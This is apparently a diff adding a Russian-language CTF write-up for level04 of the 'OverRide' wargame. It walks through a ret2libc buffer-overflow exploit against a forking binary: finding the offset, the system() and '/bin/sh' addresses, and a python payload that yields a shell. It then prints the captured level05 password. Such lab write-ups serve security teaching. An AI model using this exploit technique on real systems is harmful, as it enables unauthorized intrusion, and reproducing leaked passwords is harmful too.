@@ -1,0 +1,96 @@
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
+
+Partial RELRO  - есть защита от перемещения
+No canary found- нет канареечной защита
+NX disabled - Стек может быть выполнен
+No PIE - нет рандомизации базового адреса
+No RPATH  - нет жестких путей загрузки библиотек
+No RUNPATH - нет жестких путей загрузки библиотек
+
+При запуске программа пишет Give me some shellcode.
+(спойлер: шеллкод подать не можем)
+
+NX disabled - можно использовать шел коды и аналоги
+
+ltrace ./level04
+
+fork()                                                                                             = 3806
+wait(0xffffd61cGive me some shellcode, k
+
+Видно что вызывается fork();
+Процесс-потомок получает в качестве кода возврата значение 0,
+ если вызов fork() оказался успешным.
+https://www.opennet.ru/docs/RUS/linux_parallel/node7.html
+
+The request ptrace(PTRACE_TRACEME, 0, 0, 0);
+
+       turns the calling thread into a tracee.  The thread continues to
+       run (doesn't enter ptrace-stop).
+
+
+Если посмотреть на текст то
+readelf  -p .rodata level04
+
+String dump of section '.rodata':
+  [     8]  %u
+  [     b]  Give me some shellcode, k
+  [    25]  child is exiting...
+  [    39]  no exec() for you
+
+ [    39]  no exec() for you - намекает на то что так просто exec() мы вызвать не можем
+
+При  дизасемблирование становится понятно как это работает
+    0x08048746 <+126>:   call   0x8048570 <ptrace@plt>
+https://www.opennet.ru/man.shtml?topic=ptrace&category=2&russian=0
+
+Тут можно использовать атаку ret2libc
+
+Для этого мы должны найти смещение для перезаписи, а так же  адрес system() and  "/bin/sh"
+
+Из за особенностей программы мы так просто не можем вызвать переполнение
+(Впадает в бессконечный цикл при сигфолте)
+
+Загуглив можно найти set follow-fork-mode command
+https://visualgdb.com/gdbreference/commands/set_follow-fork-mode
+
+В этом режиме GDB переключится на дочерний процесс, если вызывается fork() или vfork()
+(gdb) set follow-fork-mode child позволит нам узнать смещение
+
+Используем генератор паттернов и получаем 0x41326641 in ?? ()
+0x41326641 смещение 156
+
+info function system
+
+0xf7e6aed0  system
+
+info proc map
+      0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+находим "/bin/sh"
+find 0xf7e2c000,0xf7fcc000,"/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+0xf7e6aed0  system = '\xf7\xe6\xae\xd0'[::-1]
+0xf7f897ec "/bin/sh" '\xf7\xf8\x97\xec'[::-1]
+
+
+python -c "'A' * 156 + system + '0000' + '/bin/sh'";
+
+python -c "print 'A' * 156 + '\xf7\xe6\xae\xd0'[::-1] + '0000'  + '\xf7\xf8\x97\xec'[::-1]" > /tmp/exploit4
+cat /tmp/exploit4 - | ./level04
+Give me some shellcode, k
+whoami
+level05
+
+cd ../level05
+cat .pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+[4]+  Stopped                 cat /tmp/exploit4 - | ./level04
+level04@OverRide:~$ su level05
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
